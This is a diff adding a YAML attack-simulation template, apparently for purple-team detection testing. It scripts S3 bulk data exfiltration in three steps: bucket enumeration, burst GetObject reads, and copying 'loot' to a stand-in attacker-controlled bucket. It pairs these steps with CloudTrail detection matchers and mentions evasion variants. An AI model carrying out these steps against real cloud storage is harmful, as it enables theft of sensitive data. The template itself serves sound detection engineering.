@@ -1,0 +1,114 @@
+id: purpleloop-s3-bulk-object-exfiltration
+
+info:
+  name: S3 Bulk Object Exfiltration — Data Theft via Burst GetObject
+  author: PurpleLoop
+  severity: critical
+  description: |
+    Simulates an attacker performing high-volume S3 GetObject calls to exfiltrate
+    sensitive data from a target bucket.  The burst pattern (many objects read in
+    rapid succession) distinguishes this from normal application access patterns.
+    Includes variants with different batch sizes and delays for evasion testing.
+  reference:
+    - https://attack.mitre.org/techniques/T1530/
+    - https://attack.mitre.org/techniques/T1537/
+  tags: aws,s3,exfiltration,data-theft,cloudtrail
+  metadata:
+    mitre_attack:
+      tactic: "TA0010 - Exfiltration"
+      technique: "T1530 - Data from Cloud Storage"
+    purpleloop:
+      attack_chain: s3-exfil
+      variant: bulk-read
+      severity_score: 9.0
+
+attack:
+  type: aws-api
+  steps:
+    # Step 1 — List bucket contents to identify targets
+    - action: s3:ListObjectsV2
+      description: Enumerate bucket contents to identify high-value objects
+      parameters:
+        Bucket: "{{target_bucket}}"
+        MaxKeys: 1000
+      delay: "0"
+      cloudtrail_event:
+        eventName: ListObjects
+        eventSource: s3.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          bucketName: "{{target_bucket}}"
+          maxKeys: "1000"
+
+    # Step 2 — Burst-read objects (repeated {{batch_size}} times)
+    - action: s3:GetObject
+      description: "Bulk download — {{batch_size}} objects in rapid succession"
+      repeat: "{{batch_size}}"
+      parameters:
+        Bucket: "{{target_bucket}}"
+        Key: "sensitive-data/records-{{iteration}}.csv"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: GetObject
+        eventSource: s3.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          bucketName: "{{target_bucket}}"
+          key: "sensitive-data/records-{{iteration}}.csv"
+        additionalEventData:
+          bytesTransferredOut: 5242880  # 5 MB per object
+
+    # Step 3 — Optional: Copy to attacker-controlled bucket
+    - action: s3:PutObject
+      description: Stage exfiltrated data into attacker-controlled bucket
+      parameters:
+        Bucket: "{{exfil_bucket}}"
+        Key: "loot/{{target_bucket}}-dump.tar.gz"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: PutObject
+        eventSource: s3.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          bucketName: "{{exfil_bucket}}"
+          key: "loot/{{target_bucket}}-dump.tar.gz"
+
+matchers:
+  - type: cloudtrail
+    name: s3-burst-read
+    condition: and
+    fields:
+      - eventName == "GetObject"
+    threshold:
+      count: 50
+      window: 60  # 50+ GetObject calls within 60 seconds
+
+  - type: cloudtrail
+    name: cross-bucket-copy
+    condition: and
+    fields:
+      - eventName == "PutObject"
+      - requestParameters.bucketName != "{{target_bucket}}"
+
+extractors:
+  - type: json
+    name: exfil-target-bucket
+    json:
+      - ".requestParameters.bucketName"
+  - type: json
+    name: bytes-exfiltrated
+    json:
+      - ".additionalEventData.bytesTransferredOut"
+
+variables:
+  delay_seconds: "0"
+  batch_size: "100"
+  source_ip: "198.51.100.42"
+  user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+  session_name: "red-team-sim"
+  target_account: "123456789012"
+  target_bucket: "company-sensitive-data"
+  exfil_bucket: "attacker-staging-bucket"
